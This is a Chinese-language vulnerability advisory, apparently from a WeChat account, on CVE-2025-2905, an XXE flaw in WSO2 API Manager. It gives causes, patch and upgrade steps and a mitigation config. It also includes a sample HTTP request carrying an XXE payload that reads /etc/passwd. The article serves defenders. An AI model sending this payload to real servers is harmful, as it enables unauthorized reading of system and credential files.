#  CVE-2025-2905（CVSS 9.1）：WSO2 API 管理器中发现严重 XXE 漏洞   
 柠檬赏金猎人   2025-05-07 13:26  
  
### 📌 漏洞摘要  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OkRKg4J9smXHePl8Nu16pOr6QicOPKUyNibZz9UOibL4PLn5zT6I9KkeAhw1pAw2dSPIuaVx8rgLqMshV85fCtngg/640?wx_fmt=jpeg "")  
  
****<table><thead style="box-sizing: border-box;margin: 0px;padding: 0px;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;background: rgba(0, 0, 0, 0.05);"><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">漏洞编号</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">CVE-2025-2905</span></td></tr></thead><tbody style="box-sizing: border-box;margin: 0px;padding: 0px;"><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">CVSS评分</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">9.1 (高危)</span></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">影响版本</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">WSO2 API Manager ≤2.0.0</span></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">漏洞类型</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">XML外部实体注入(XXE)</span></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">攻击复杂度</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">低</span></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">所需权限</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">无需认证</span></td></tr></tbody></table>### 🔍 漏洞成因  
  
```
- 网关组件对URL路径中的XML输入验证不足
- XML解析器配置允许处理外部实体
- 未禁用DTD(Document Type Definition)解析
```  
  
### ⚡ 数据包样例  
  
```
POST /gateway HTTP/1.1
Host: vulnerable-server
Content-Type: application/xml

<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<request>&xxe;</request>
```  
### 📁 文件读取能力对比  
<table><thead style="box-sizing: border-box;margin: 0px;padding: 0px;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;background: rgba(0, 0, 0, 0.05);"><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">JDK版本</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">可读取内容</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">风险等级</span></td></tr></thead><tbody style="box-sizing: border-box;margin: 0px;padding: 0px;"><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">JDK ≤7</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">完整文件内容</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">🔴 严重</span></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">JDK 8+</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">仅文件首行</span></td><td style="box-sizing: border-box;margin: 0px;padding: 0.25em 0.5em;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(223, 223, 223);"><span style="font-size: 14px;">🟠 高危</span></td></tr></tbody></table>### ⚠️ 其他风险  
  
•服务器端请求伪造(SSRF)  
•拒绝服务攻击(DoS)  
•内网端口扫描  
### 🔧 官方补丁  
  
```
1. 确认已安装WSO2-2016-0151补丁：
   • 补丁下载：https://wso2.com/security-patch-releases
   • 安装指南：`bin/wso2update_linux apply WSO2-2016-0151`

2. 升级到最新安全版本：
   • 当前稳定版：WSO2 API Manager 4.1.0
```  
### ⚙️ 临时缓解措施  
  
```
<!-- repository/conf/security/xxe-security.xml -->
<xxeConfig>
    <enableProtection>true</enableProtection>
    <disallowDocTypeDecl>true</disallowDocTypeDecl>
</xxeConfig>
```  
  
  
  
仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行  
承担相应后果，我们将不承担任何法律及连带责任。  
“如侵权请私聊公众号删文”。  
  
